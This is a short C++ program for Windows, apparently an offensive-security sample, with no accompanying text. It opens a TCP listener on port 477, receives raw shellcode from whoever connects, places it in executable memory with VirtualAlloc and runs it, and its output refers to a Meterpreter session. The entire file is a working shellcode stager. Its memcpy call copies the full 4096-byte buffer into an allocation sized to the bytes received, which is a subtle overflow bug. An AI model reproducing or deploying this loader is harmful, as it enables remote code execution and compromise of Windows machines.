#include <WinSock2.h>
#include <WS2tcpip.h>
#include <iostream>
#include <Windows.h>
#pragma comment(lib, "ws2_32.lib")

int main()
{
	LPWSADATA wsaData = new WSAData();
	ADDRINFOA* socketHint = new ADDRINFOA();
	ADDRINFOA* addressInfo = new ADDRINFOA();
	SOCKET listenSocket = INVALID_SOCKET;
	SOCKET clientSocket = INVALID_SOCKET;
	CHAR bufferReceivedBytes[4096] = { 0 };
	INT receivedBytes = 0;
	PCSTR port = "477";

	socketHint->ai_family = AF_INET;
	socketHint->ai_socktype = SOCK_STREAM;
	socketHint->ai_protocol = IPPROTO_TCP;
	socketHint->ai_flags = AI_PASSIVE;

	WSAStartup(MAKEWORD(2, 2), wsaData);
	GetAddrInfoA(NULL, port, socketHint, &addressInfo);

	listenSocket = socket(addressInfo->ai_family, addressInfo->ai_socktype, addressInfo->ai_protocol);
	bind(listenSocket, addressInfo->ai_addr, addressInfo->ai_addrlen);
	listen(listenSocket, SOMAXCONN);
	std::cout << "Listening on TCP port " << port << std::endl;

	clientSocket = accept(listenSocket, NULL, NULL);
	std::cout << "Incoming connection..." << std::endl;

	receivedBytes = recv(clientSocket, bufferReceivedBytes, sizeof(bufferReceivedBytes), NULL);
	if (receivedBytes > 0) {
		std::cout << "Received shellcode bytes " << receivedBytes << std::endl;
	}

	LPVOID shellcode = VirtualAlloc(NULL, receivedBytes, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	std::cout << "Allocated memory for shellocode at: " << shellcode << std::endl;

	memcpy(shellcode, bufferReceivedBytes, sizeof(bufferReceivedBytes));
	std::cout << "Copied shellcode to: " << shellcode << std::endl << "Sending back meterpreter session...";
	((void(*)()) shellcode)();

	return 0;
}